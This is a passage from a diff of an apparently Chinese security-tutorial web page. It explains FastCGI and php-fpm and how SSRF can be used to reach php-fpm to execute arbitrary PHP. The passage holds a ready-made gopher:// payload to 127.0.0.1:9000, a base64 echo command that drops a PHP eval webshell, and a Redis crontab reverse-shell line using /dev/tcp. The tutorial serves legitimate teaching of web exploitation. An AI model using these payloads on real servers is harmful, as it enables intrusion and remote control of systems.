     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>#######  理论</p>
-<p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
+</h2><h3 id="理论-1" class="heading-element"><span>理论</span>
+  <a href="#%e7%90%86%e8%ae%ba-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
 <p>nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。</p>
 <p>nginx一般是把请求发fastcgi管理进程处理，fascgi管理进程选择cgi子进程处理结果并返回被nginx</p>
 <p>php-fpm:https://zhuanlan.zhihu.com/p/99271704</p>
 <p>nginx和php-fpm的交互：https://learnku.com/articles/41710</p>
 <p><em><strong>简而言之，nginx知识一个服务器，php相关的活还得转交给背后的php干，而fastcgi就是这个“通讯兵”，而且是遵从某种转接规则的通讯兵，而php-fpm就是管理这些“通讯兵”的长官。</strong></em></p>
-<p>#######  攻击实现原理</p>
-<p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
+<h3 id="攻击实现原理-1" class="heading-element"><span>攻击实现原理</span>
+  <a href="#%e6%94%bb%e5%87%bb%e5%ae%9e%e7%8e%b0%e5%8e%9f%e7%90%86-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
 <p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
 <p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
 <p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
@@ -415,8 +450,11 @@ flushallset 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/反弹IP/反弹端
 echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</code></pre><p>现成的payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">gopher</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">3</span><span style="color:#58a1dd">A</span><span style="color:#828b96;font-style:italic">//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520/var/www/html/shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
 </span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png" alt="image-20230328102340167" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=large 2x" data-title="image-20230328102340167" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p>#######  这里有一个利用ssrf302跳转打本地fpm的例子</p>
-<p>ssrf 302跳转绕过，打本地php-fpm</p>
+<h3 id="这里有一个利用ssrf302跳转打本地fpm的例子" class="heading-element"><span>这里有一个利用ssrf302跳转打本地fpm的例子</span>
+  <a href="#%e8%bf%99%e9%87%8c%e6%9c%89%e4%b8%80%e4%b8%aa%e5%88%a9%e7%94%a8ssrf302%e8%b7%b3%e8%bd%ac%e6%89%93%e6%9c%ac%e5%9c%b0fpm%e7%9a%84%e4%be%8b%e5%ad%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>ssrf 302跳转绕过，打本地php-fpm</p>
 <p>302.php</p>
 <!-- raw HTML omitted -->
 <!-- raw HTML omitted -->
